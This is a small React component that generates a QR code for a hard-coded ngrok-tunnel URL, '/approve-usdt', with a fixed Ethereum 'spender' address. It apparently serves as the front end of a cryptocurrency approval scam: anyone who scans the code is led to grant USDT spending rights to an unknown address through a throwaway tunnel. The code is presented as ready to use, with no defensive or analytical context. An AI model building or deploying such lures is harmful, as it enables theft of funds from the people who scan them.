import { useState } from "react";
import QRCode from "qrcode";
import "./App.css";

function App() {
  const [qr, setQr] = useState("");

  const generateQR = async () => {
    const approvalUrl =
      "https://reversing-reliant-scavenger.ngrok-free.dev/approve-usdt" +
      "?spender=0x422B0755EABeA90Cc2C5674F8Bba65C861962fdD";

    const qrImage = await QRCode.toDataURL(approvalUrl);

    setQr(qrImage);
  };

  return (
    <div className="container">
      <div className="card">
        <button onClick={generateQR} className="generate-btn">
          Generate QR
        </button>

        {qr && (
          <div className="qr-container">
            <img src={qr} alt="QR Code" />
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
